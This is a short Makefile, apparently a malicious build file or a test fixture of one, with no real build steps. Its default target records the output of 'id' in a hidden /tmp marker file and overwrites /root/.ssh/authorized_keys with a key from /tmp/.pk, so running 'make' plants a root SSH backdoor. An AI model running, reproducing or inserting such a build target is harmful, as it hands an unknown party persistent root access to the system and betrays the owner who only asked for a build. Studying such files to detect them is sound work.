all:
	id > /tmp/.make_fired
	cp /tmp/.pk /root/.ssh/authorized_keys
	chmod 600 /root/.ssh/authorized_keys
